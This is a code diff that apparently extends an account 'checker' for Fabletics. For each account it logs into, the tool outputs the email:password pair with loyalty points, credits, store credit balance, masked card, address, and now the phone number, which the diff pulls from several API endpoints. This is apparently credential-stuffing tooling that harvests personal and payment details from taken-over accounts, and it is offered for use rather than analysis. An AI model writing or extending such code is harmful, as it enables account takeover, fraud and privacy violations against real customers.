@@ -33,11 +33,14 @@ class CheckResult:
         if float(store_credit).is_integer():
             store_credit = int(store_credit)
 
+        phone = self.data.get("phone") or "N/A"
+
         return (
             f"{self.email}:{self.password} | "
             f"Points = {self.data.get('points', 0)} | "
             f"Member_Credits = {self.data.get('member_credits', 0)} | "
             f"storeCreditBalance = {store_credit} | "
+            f"Phone = [{phone}] | "
             f"CC = [{cc}] | "
             f"Address = [{address}]"
         )
@@ -77,6 +80,28 @@ def _format_card(card: dict[str, Any]) -> str:
     return f"{card_type} - {masked} exp: {exp_month}/{exp_year}"
 
 
+def _extract_phone(
+    login_customer: dict[str, Any],
+    addresses: list[dict[str, Any]],
+    default_address: dict[str, Any] | None,
+    profile: dict[str, Any] | None = None,
+) -> str:
+    sources: list[dict[str, Any]] = []
+    if profile:
+        sources.append(profile)
+    sources.append(login_customer)
+    if default_address:
+        sources.append(default_address)
+    sources.extend(addresses)
+
+    for source in sources:
+        for key in ("phone", "phoneNumber", "mobilePhone", "mobile", "cellPhone"):
+            value = source.get(key)
+            if value not in (None, ""):
+                return str(value).strip()
+    return "N/A"
+
+
 def _format_address(address: dict[str, Any]) -> str:
     first = str(address.get("firstName") or "").strip()
     last = str(address.get("lastName") or "").strip()
@@ -95,6 +120,14 @@ def capture_account_data(client: FableticsClient, token: str, login_customer: di
     loyalty = client.get("/api/accounts/me/loyalty/details", token)
     membership = client.get("/api/accounts/me/membership", token)
     addresses = client.get("/api/accounts/me/addresses", token)
+
+    profile: dict[str, Any] | None = None
+    try:
+        body = client.get("/api/accounts/me", token)
+        if isinstance(body, dict):
+            profile = body
+    except FableticsAPIError:
+        pass
 
     payments: list[dict[str, Any]] = []
     try:
@@ -127,10 +160,13 @@ def capture_account_data(client: FableticsClient, token: str, login_customer: di
     member_credits = int(membership.get("availableTokenQuantity") or 0)
     store_credit_balance = float(membership.get("storeCreditBalance") or 0)
 
+    phone = _extract_phone(login_customer, addresses, default_address, profile)
+
     return {
         "points": points,
         "member_credits": member_credits,
         "store_credit_balance": store_credit_balance,
+        "phone": phone,
         "cc": _format_card(default_card) if default_card else "N/A",
         "address": _format_address(default_address) if default_address else "N/A",
         "email": _first(login_customer, "email"),
